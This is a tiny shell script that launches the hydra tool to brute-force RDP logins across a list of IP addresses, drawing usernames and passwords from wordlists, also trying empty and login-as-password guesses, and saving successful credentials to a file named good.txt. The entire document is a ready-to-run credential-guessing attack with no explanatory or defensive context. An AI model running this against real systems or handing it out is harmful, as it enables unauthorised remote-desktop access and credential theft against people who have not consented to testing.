#!/bin/sh
hydra -L user.txt -P passwd.txt -e ns -M ip.txt -f -o good.txt -w 10 -W 3 -t 1 rdp
